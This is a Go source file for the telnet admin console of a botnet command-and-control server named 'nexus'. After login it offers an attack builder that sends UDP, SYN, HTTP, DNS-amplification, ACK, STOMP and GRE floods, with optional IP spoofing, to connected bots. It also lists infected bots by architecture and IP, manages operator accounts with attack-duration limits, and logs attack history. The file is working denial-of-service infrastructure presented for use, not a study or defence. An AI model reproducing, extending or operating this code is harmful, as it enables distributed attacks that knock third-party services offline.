// admin.go — telnet admin console.
//
// When a connection doesn't start with the bot magic byte, it's treated
// as an admin telnet session. The admin gets:
//   1. ANSI art banner
//   2. Login prompt (username + password)
//   3. Interactive command menu
//   4. Attack builder, bot list, user management, history
//
// Telnet negotiation (IAC) is handled minimally — we just echo back
// DO/WILL for the common options and strip IAC sequences from input.

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"time"
)

const (
	// Telnet protocol bytes.
	IAC  = 255
	DONT = 254
	DO   = 253
	WONT = 252
	WILL = 251
	SB   = 250
	SE   = 240

	banner = `
         ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
         ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
         ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
         ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
         ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
         ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝

                   nexus command console  v1.0
`
	promptFmt = "\r\nnexus(%d)> "
)

type adminSession struct {
	conn   net.Conn
	reader *bufio.Reader
	writer *bufio.Writer
	user   *UserRecord
}

func handleAdmin(conn net.Conn, reader *bufio.Reader) {
	defer conn.Close()

	s := &adminSession{
		conn:   conn,
		reader: reader,
		writer: bufio.NewWriter(conn),
	}

	// Send telnet negotiation: we'll echo characters and suppress go-ahead.
	s.write([]byte{ IAC, WILL, 1 })   // echo
	s.write([]byte{ IAC, WILL, 3 })   // suppress go-ahead
	s.write([]byte{ IAC, DO, 3 })     // request they suppress go-ahead
	s.flush()

	// --- banner ---
	s.writeString(banner)
	s.flush()

	// --- login ---
	if !s.login() {
		return
	}

	log.Printf("[+] admin login: %s from %s", s.user.Username, conn.RemoteAddr())

	// --- main loop ---
	s.mainLoop()
	log.Printf("[*] admin logout: %s", s.user.Username)
}

func (s *adminSession) login() bool {
	for attempt := 0; attempt < 3; attempt++ {
		s.writeString("\r\nlogin: ")
		s.flush()
		username, err := s.readLine()
		if err != nil {
			return false
		}
		username = strings.TrimSpace(username)

		s.writeString("password: ")
		s.flush()

		// Read password with echo suppression.
		// Request client not to echo (WILL 1 = we'll handle echo).
		s.write([]byte{ IAC, DO, 1 })
		s.flush()

		password, err := s.readLine()
		if err != nil {
			return false
		}
		password = strings.TrimSpace(password)

		// Re-enable echo.
		s.write([]byte{ IAC, DONT, 1 })
		s.flush()

		s.writeString("\r\n")

		user := store.ValidateUser(username, password)
		if user != nil {
			s.user = user
			s.writeString(fmt.Sprintf("\r\nwelcome, %s.\r\n", username))
			s.flush()
			return true
		}

		s.writeString("invalid credentials.\r\n")
		s.flush()
		time.Sleep(1 * time.Second)
	}
	return false
}

func (s *adminSession) mainLoop() {
	for {
		s.writeString(fmt.Sprintf(promptFmt, mgr.Count()))
		s.flush()

		line, err := s.readLine()
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)

		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := strings.ToLower(parts[0])

		switch cmd {
		case "attack", "a":
			s.cmdAttack(parts[1:])
		case "bots", "b":
			s.cmdBots()
		case "users", "u":
			s.cmdUsers(parts[1:])
		case "history", "h":
			s.cmdHistory()
		case "help", "?":
			s.cmdHelp()
		case "exit", "quit", "q":
			s.writeString("goodbye.\r\n")
			s.flush()
			return
		case "clear", "cls":
			s.writeString("\033[2J\033[H")
			s.flush()
		default:
			s.writeString(fmt.Sprintf("unknown command: %s  (type 'help')\r\n", cmd))
			s.flush()
		}
	}
}

// --- command handlers ---

func (s *adminSession) cmdAttack(args []string) {
	if len(args) == 0 {
		s.writeString("\r\n")
		s.writeString("  attack — launch an attack\r\n")
		s.writeString("  syntax: attack <type> <target>[:port] [duration=N] [threads=N] [...]\r\n")
		s.writeString("\r\n")
		s.writeString("  types:\r\n")
		s.writeString("    udp     — UDP flood (raw packet spam)\r\n")
		s.writeString("    syn     — TCP SYN flood\r\n")
		s.writeString("    http    — HTTP layer-7 flood\r\n")
		s.writeString("    dns     — DNS amplification\r\n")
		s.writeString("    ack     — TCP ACK flood\r\n")
		s.writeString("    stomp   — TCP STOMP flood\r\n")
		s.writeString("    greip   — GRE IP tunnel flood\r\n")
		s.writeString("\r\n")
		s.writeString("  options:\r\n")
		s.writeString("    duration=N    — attack duration in seconds (default: 60)\r\n")
		s.writeString("    pkt_size=N    — packet size in bytes (UDP/SYN)\r\n")
		s.writeString("    threads=N     — worker threads (HTTP)\r\n")
		s.writeString("    method=GET    — HTTP method (GET/POST/HEAD)\r\n")
		s.writeString("    path=/        — HTTP request path\r\n")
		s.writeString("    host=X        — HTTP Host header\r\n")
		s.writeString("    src_port=N    — source port\r\n")
		s.writeString("    spoofed=1     — enable IP spoofing\r\n")
		s.writeString("\r\n")
		s.writeString("  examples:\r\n")
		s.writeString("    attack udp 192.168.1.1:80 duration=120 pkt_size=1400\r\n")
		s.writeString("    attack syn 10.0.0.1:443 duration=300 threads=4\r\n")
		s.writeString("    attack http example.com:80 method=GET path=/ host=example.com\r\n")
		s.flush()
		return
	}

	// Admin-only: check bot availability.
	if mgr.Count() == 0 {
		s.writeString("\r\n[!] no bots connected. attack queuing not supported yet.\r\n")
		s.flush()
		return
	}

	// Build the attack command from user input.
	input := strings.Join(args, " ")
	cmd, err := ParseAttackCommand(input)
	if err != nil {
		s.writeString(fmt.Sprintf("\r\n[!] parse error: %v\r\n", err))
		s.flush()
		return
	}

	// Check user limits.
	if !s.user.IsAdmin {
		if s.user.MaxDuration > 0 && int(cmd.Duration) > s.user.MaxDuration {
			s.writeString(fmt.Sprintf("\r\n[!] max duration for your account is %ds\r\n", s.user.MaxDuration))
			s.flush()
			return
		}
	}

	// Dispatch.
	botCount, err := mgr.Dispatch(cmd)
	if err != nil {
		s.writeString(fmt.Sprintf("\r\n[!] dispatch failed: %v\r\n", err))
		s.flush()
		return
	}

	// Record in history.
	store.RecordAttack(s.user.Username, cmd.Type.String(),
		fmt.Sprintf("%s:%d", cmd.Targets[0].IP, cmd.Targets[0].Port),
		int(cmd.Duration), botCount)

	s.writeString(fmt.Sprintf(
		"\r\n[+] attack #%d launched  type=%s  targets=%d  duration=%ds  bots=%d\r\n",
		store.Data.NextAtkID-1, cmd.Type, len(cmd.Targets), cmd.Duration, botCount))
	s.flush()
}

func (s *adminSession) cmdBots() {
	count := mgr.Count()
	if count == 0 {
		s.writeString("\r\n  no bots connected.\r\n")
		s.flush()
		return
	}

	s.writeString(fmt.Sprintf("\r\n  %d bot(s) connected\r\n", count))
	s.writeString("  ──────────────────────────────────────────────────────────────\r\n")

	archs := mgr.CountByArch()
	for arch, n := range archs {
		s.writeString(fmt.Sprintf("  %-16s  %d\r\n", arch, n))
	}

	s.writeString("  ──────────────────────────────────────────────────────────────\r\n")
	s.writeString(fmt.Sprintf("  %-16s  %d\r\n", "total", count))
	s.writeString("\r\n")

	// Show individual bots (up to 20).
	bots := mgr.List()
	limit := 20
	if len(bots) < limit {
		limit = len(bots)
	}
	if limit > 0 {
		s.writeString(fmt.Sprintf("  showing %d/%d bots:\r\n", limit, len(bots)))
		s.writeString(fmt.Sprintf("  %-6s  %-10s  %-18s  %s\r\n", "ID", "ARCH", "IP", "UPTIME"))
		for i := 0; i < limit; i++ {
			uptime := time.Since(bots[i].Connected).Round(time.Second)
			s.writeString(fmt.Sprintf("  #%-4d  %-10s  %-18s  %v\r\n",
				bots[i].ID, bots[i].Arch, bots[i].RemoteIP, uptime))
		}
	}
	s.flush()
}

func (s *adminSession) cmdUsers(args []string) {
	if len(args) == 0 {
		// List users.
		users := store.ListUsers()
		s.writeString("\r\n  users:\r\n")
		s.writeString("  ─────────────────────────────────────────────\r\n")
		for _, u := range users {
			role := "user"
			if u.IsAdmin {
				role = "admin"
			}
			s.writeString(fmt.Sprintf("  %-16s  %-6s  max_dur=%ds  cooldown=%ds\r\n",
				u.Username, role, u.MaxDuration, u.Cooldown))
		}
		s.writeString("\r\n")
		s.flush()
		return
	}

	subcmd := strings.ToLower(args[0])
	switch subcmd {
	case "add":
		if len(args) < 3 {
			s.writeString("  usage: users add <username> <password> [admin=0]\r\n")
			s.flush()
			return
		}
		isAdmin := false
		if len(args) > 3 && (args[3] == "1" || strings.ToLower(args[3]) == "admin") {
			isAdmin = true
		}
		err := store.AddUser(args[1], args[2], isAdmin, 0, 0, 0)
		if err != nil {
			s.writeString(fmt.Sprintf("  [!] %v\r\n", err))
		} else {
			s.writeString(fmt.Sprintf("  [+] user '%s' created.\r\n", args[1]))
		}
		s.flush()

	case "del", "remove":
		if len(args) < 2 {
			s.writeString("  usage: users del <username>\r\n")
			s.flush()
			return
		}
		// Can't delete yourself.
		if args[1] == s.user.Username {
			s.writeString("  [!] cannot delete your own account.\r\n")
			s.flush()
			return
		}
		err := store.RemoveUser(args[1])
		if err != nil {
			s.writeString(fmt.Sprintf("  [!] %v\r\n", err))
		} else {
			s.writeString(fmt.Sprintf("  [+] user '%s' removed.\r\n", args[1]))
		}
		s.flush()

	default:
		s.writeString(fmt.Sprintf("  unknown users subcommand: %s (try: add, del)\r\n", subcmd))
		s.flush()
	}
}

func (s *adminSession) cmdHistory() {
	attacks := store.GetHistory(20)
	if len(attacks) == 0 {
		s.writeString("\r\n  no attack history.\r\n")
		s.flush()
		return
	}

	s.writeString("\r\n  recent attacks:\r\n")
	s.writeString("  ───────────────────────────────────────────────────────────────────────────────\r\n")
	// Show newest first.
	for i := len(attacks) - 1; i >= 0; i-- {
		a := attacks[i]
		s.writeString(fmt.Sprintf("  #%-4d  %-8s  %-6s  %-22s  %4ds  %4d bots  %s\r\n",
			a.ID, a.Username, a.Type, a.Target, a.Duration, a.BotCount, a.Timestamp))
	}
	s.writeString("\r\n")
	s.flush()
}

func (s *adminSession) cmdHelp() {
	s.writeString("\r\n")
	s.writeString("  nexus CNC commands:\r\n")
	s.writeString("  ────────────────────────────────────────────\r\n")
	s.writeString("  attack, a     launch an attack\r\n")
	s.writeString("  bots, b       list connected bots\r\n")
	s.writeString("  users, u      manage users (add/del/list)\r\n")
	s.writeString("  history, h    attack history (last 20)\r\n")
	s.writeString("  help, ?       show this help\r\n")
	s.writeString("  clear, cls    clear screen\r\n")
	s.writeString("  exit, quit    disconnect\r\n")
	s.writeString("\r\n")
	s.writeString(fmt.Sprintf("  shortcut: just type an attack command directly\r\n"))
	s.writeString(fmt.Sprintf("    e.g.: udp 1.2.3.4:80 duration=60\r\n"))
	s.writeString("\r\n")
	s.flush()
}

// --- I/O helpers ---

func (s *adminSession) readLine() (string, error) {
	line, err := s.reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	// Strip trailing \r\n.
	line = strings.TrimRight(line, "\r\n")
	return line, nil
}

func (s *adminSession) writeString(msg string) {
	s.writer.WriteString(msg)
}

func (s *adminSession) write(data []byte) {
	s.writer.Write(data)
}

func (s *adminSession) flush() {
	s.writer.Flush()
}

// suppressTelnet strips IAC escape sequences from input bytes.
func suppressTelnet(data []byte) []byte {
	// Minimal — strip 3-byte IAC sequences (IAC + cmd + opt).
	cleaned := make([]byte, 0, len(data))
	for i := 0; i < len(data); i++ {
		if data[i] == IAC && i+2 < len(data) {
			i += 2 // skip the IAC command and its option
			continue
		}
		cleaned = append(cleaned, data[i])
	}
	return cleaned
}

// Proxy ReadString so we can strip telnet IACs transparently.
// (Using bufio.Reader directly; the caller strips IAC post-hoc if needed.)
var _ = suppressTelnet
var _ = io.ReadFull
